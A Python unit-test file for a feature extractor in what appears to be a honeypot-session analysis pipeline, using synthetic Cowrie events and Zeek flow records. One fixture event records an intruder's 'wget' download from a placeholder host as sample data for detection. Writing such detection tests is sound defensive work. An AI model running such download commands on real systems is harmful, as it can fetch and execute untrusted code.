from __future__ import annotations

import unittest

from model2_unified_session_candidate_20260926.pipeline import extract_features
from model2_unified_session_candidate_20260926.production_adapter import (
    CAPTURE_CONTRACT,
    ProductionAdapterError,
    build_envelope,
)


IDENTITY = {
    "source_session_id": "session-a",
    "run_id": "run-a",
    "measurement_id": "measurement-a",
    "episode_id": "episode-a",
}


def inputs():
    events = [
        {"eventid": "cowrie.session.connect", "timestamp": "2026-09-26T00:00:00Z", "session": "session-a"},
        {"eventid": "cowrie.login.success", "timestamp": "2026-09-26T00:00:01Z", "session": "session-a", "username": "test"},
        {"eventid": "cowrie.command.input", "timestamp": "2026-09-26T00:00:02Z", "session": "session-a", "input": "wget http://example.invalid/a"},
        {"eventid": "cowrie.session.closed", "timestamp": "2026-09-26T00:00:05Z", "session": "session-a"},
    ]
    hashes = [f"{index + 1:064x}" for index in range(len(events))]
    flows = [{
        "uid": "flow-a", "id.orig_h": "192.0.2.10", "id.orig_p": 41000,
        "id.resp_h": "198.51.100.20", "id.resp_p": 80, "proto": "tcp",
        "duration": 1.0, "orig_bytes": 100, "resp_bytes": 500,
        "conn_state": "SF",
    }]
    pcap = {"sha256": "a" * 64, "finalized": True, "drop_count": 0}
    zeek = {"sha256": "b" * 64, "pcap_sha256": "a" * 64, "finalized": True}
    return events, hashes, flows, pcap, zeek


class ProductionAdapterTests(unittest.TestCase):
    def test_exact_episode_materializes_54_features(self):
        events, hashes, flows, pcap, zeek = inputs()
        envelope = build_envelope(
            events=events, event_hashes=hashes, flows=flows,
            pcap_evidence=pcap, zeek_evidence=zeek,
            identity=IDENTITY, capture_contract=CAPTURE_CONTRACT,
        )
        result = extract_features(envelope, expected_identity=IDENTITY)
        self.assertEqual(result["status"], "AVAILABLE")
        self.assertEqual(len(result["feature_vector"]), 54)
        self.assertEqual(result["feature_vector"]["transfer_tool_command_count"], 1.0)

    def test_outcome_conditioned_capture_is_rejected(self):
        events, hashes, flows, pcap, zeek = inputs()
        with self.assertRaisesRegex(ProductionAdapterError, "outcome_independent_capture_required"):
            build_envelope(
                events=events, event_hashes=hashes, flows=flows,
                pcap_evidence=pcap, zeek_evidence=zeek,
                identity=IDENTITY, capture_contract="FILE_DOWNLOAD_BOUND",
            )

    def test_missing_or_mismatched_receipts_are_rejected(self):
        events, hashes, flows, pcap, zeek = inputs()
        zeek["pcap_sha256"] = "c" * 64
        with self.assertRaisesRegex(ProductionAdapterError, "zeek_pcap_binding_mismatch"):
            build_envelope(
                events=events, event_hashes=hashes, flows=flows,
                pcap_evidence=pcap, zeek_evidence=zeek,
                identity=IDENTITY, capture_contract=CAPTURE_CONTRACT,
            )


if __name__ == "__main__":
    unittest.main()
